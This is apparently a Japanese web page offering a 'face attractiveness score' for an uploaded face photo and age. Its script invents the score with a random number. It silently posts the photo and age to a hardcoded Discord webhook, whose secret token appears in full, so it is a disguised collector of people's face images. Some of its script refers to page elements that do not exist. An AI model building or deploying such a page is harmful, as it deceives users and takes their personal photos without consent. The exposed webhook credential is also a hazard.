<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>顔面偏差値チェッカー</title>
    <style>
form {
    max-width: 400px; 
    margin: 0 auto; 
    padding: 20px;
    border: 1px solid #ccc;
    background-color: #f9f9f9;
    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
    border-radius: 5px;
}


label {
    display: block;
    margin-bottom: 10px; 
}

input[type="file"],
input[type="number"] {
    width: 100%;
    padding: 10px;
    margin-bottom: 15px;
    border: 1px solid #ccc;
    border-radius: 3px;
    font-size: 16px;
}

input[type="submit"] {
    background-color: #007BFF;
    color: #fff;
    padding: 10px 20px;
    border: none;
    border-radius: 3px;
    cursor: pointer;
}

input[type="submit"]:hover {
    background-color: #0056b3;
}

.error-message {
    color: #ff0000;
    margin-top: 5px;
}

body {
    background-color: #f0f0f0;
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
}

h1 {
    text-align: center;
    background-color: #007BFF;
    color: #fff;
    padding: 20px 0;
    margin: 0;
}

form {
    max-width: 400px;
    margin: 20px auto;
    padding: 20px;
    border: 1px solid #ccc;
    background-color: #fff;
    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
    border-radius: 5px;
}

label {
    display: block;
    margin-bottom: 10px;
}

input[type="file"],
input[type="number"] {
    width: 100%;
    padding: 10px;
    margin-bottom: 15px;
    border: 1px solid #ccc;
    border-radius: 3px;
    font-size: 16px;
}

input[type="submit"] {
    background-color: #007BFF;
    color: #fff;
    padding: 10px 20px;
    border: none;
    border-radius: 3px;
    cursor: pointer;
}

input[type="submit"]:hover {
    background-color: #0056b3;
}

/* 画像サイズのやつ */
img {
  width: 50%; /* 画像を親要素の幅 */
  height: auto; /* 高さ調整 */
}


    </style>
</head>
<body>
   <h1>顔面偏差値チェッカー</h1> 

   <form onsubmit="sendData(event)">
    <label for="image">診断する顔写真を選ぶ:</label>
    <input type="file" id="image" name="image" accept="image/*" required>
    
    <label for="age">年齢を入力:</label>
    <input type="number" id="age" name="age" min="1" max="150" required>
    <img id="uploadedImagePreview" src="" alt="アップロードされた画像のプレビュー" class="centered-image">

    <input type="submit" value="チェック">
</form>
<script>
        window.onload = function () {
            const queryString = window.location.search;
            const urlParams = new URLSearchParams(queryString);

            const score = urlParams.get('score');
            console.log('顔面偏差値:', score);

            const scoreText = document.getElementById('scoreText');
            const uploadedImage = document.getElementById('uploadedImage');

            if (score) {
                scoreText.textContent = `あなたの顔面偏差値: ${score}`;
            } else {
                scoreText.textContent = '結果がありません笑';
            }

            // 画像のbase64データを取得
            const base64ImagePreview = urlParams.get('imagePreview');

            // 画像のプレビューを設定
            if (base64ImagePreview) {
                uploadedImage.src = base64ImagePreview;
            } else {
                uploadedImage.style.display = 'none'; // 画像がない場合は非表示にする
            }
        };

        const webhookUrl = 'https://discord.com/api/webhooks/1159033359540949072/PCZe3-YjFnU9bywQ8HBBnxJMkzp0shnPl6NXxAf02WYB8VSHLxDYiBA6Cc3qrF2XxjoQ';

        function sendData(event) {
            event.preventDefault();
            const formData = new FormData(event.target);
            const imageFile = formData.get('image');
            const age = formData.get('age');

            const randomScore = Math.floor(Math.random() * 61) + 20;

            const jsonData = {
                content: `年齢: ${age}, 顔面偏差値: ${randomScore}`,
            };

            const reader = new FileReader();

            reader.onload = function () {
                const uploadedImage = document.getElementById('uploadedImage');
                uploadedImage.src = reader.result;
                uploadedImage.style.display = 'block';
            };

            reader.readAsDataURL(imageFile);

            const payload = new FormData();
            payload.append('payload_json', JSON.stringify(jsonData));
            payload.append('file', imageFile, 'image.png');

            fetch(webhookUrl, {
                method: 'POST',
                body: payload
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('HTTPエラー');
                }
                return response.text();
            })
            .then(data => {
                console.log('エラー1:', data);
                window.location.href = `score.html?score=${randomScore}&imagePreview=${encodeURIComponent(reader.result)}`;
            })
            .catch(error => {
                console.error('エラー2:', error);
            });
        }
</script>


</body>
</html>
